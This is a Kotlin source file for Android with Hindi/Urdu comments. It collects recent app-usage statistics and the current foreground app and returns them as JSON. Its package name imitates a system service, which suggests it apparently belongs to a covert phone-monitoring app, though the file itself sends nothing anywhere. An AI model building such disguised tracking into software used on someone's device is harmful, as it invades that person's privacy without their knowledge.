package com.system.service.monitors

import android.app.usage.UsageStatsManager
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object AppUsageManager {

    /** Pichle N ghante mein kaun kaun se apps khule */
    fun getUsageStats(context: Context, hours: Int = 24): JSONArray {
        val result = JSONArray()
        try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val start = now - hours * 60 * 60 * 1000L
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, start, now)
            stats?.sortedByDescending { it.lastTimeUsed }?.forEach { s ->
                if (s.totalTimeInForeground > 0) {
                    result.put(JSONObject().apply {
                        put("package",   s.packageName)
                        put("lastUsed",  s.lastTimeUsed)
                        put("totalTime", s.totalTimeInForeground)
                    })
                }
            }
        } catch (_: Exception) {}
        return result
    }

    /** Abhi kaun sa app chal raha hai */
    fun getCurrentApp(context: Context): String? {
        return try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 5000, now)
            stats?.maxByOrNull { it.lastTimeUsed }?.packageName
        } catch (_: Exception) { null }
    }
}
